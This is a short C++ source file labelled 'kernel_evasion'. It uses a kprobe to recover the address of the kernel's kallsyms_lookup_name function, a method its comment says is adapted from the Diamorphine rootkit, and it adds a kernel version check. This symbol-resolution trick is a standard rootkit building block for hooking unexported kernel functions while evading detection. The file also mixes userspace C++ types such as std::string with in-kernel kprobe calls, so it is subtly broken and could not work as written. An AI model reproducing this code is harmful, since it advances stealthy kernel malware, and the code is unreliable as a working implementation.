#include "common.h"
#include <linux/kprobes.h>
#include <linux/kallsyms.h>

namespace kernel_evasion {

// Kprobe-based resolution of kallsyms_lookup_name.
// Adapted from Diamorphine (m0nad/Diamorphine).
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};

uint64_t resolve_kernel_symbol(const std::string& symbol) {
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    static kallsyms_lookup_name_t lookup_fn = NULL;

    if (!lookup_fn) {
        if (register_kprobe(&kp) < 0) {
            return 0;
        }
        lookup_fn = (kallsyms_lookup_name_t)kp.addr;
        unregister_kprobe(&kp);
    }

    if (!lookup_fn) return 0;
    return (uint64_t)lookup_fn(symbol.c_str());
}

uint64_t get_kprobe_registered_symbol(const std::string& symbol) {
    return resolve_kernel_symbol(symbol);
}

bool check_kernel_compatibility() {
    KernelInfo kernel = get_kernel_info();
    KernelInfo min_version{5, 7, 0, ""};
    return kernel >= min_version;
}

}  // namespace kernel_evasion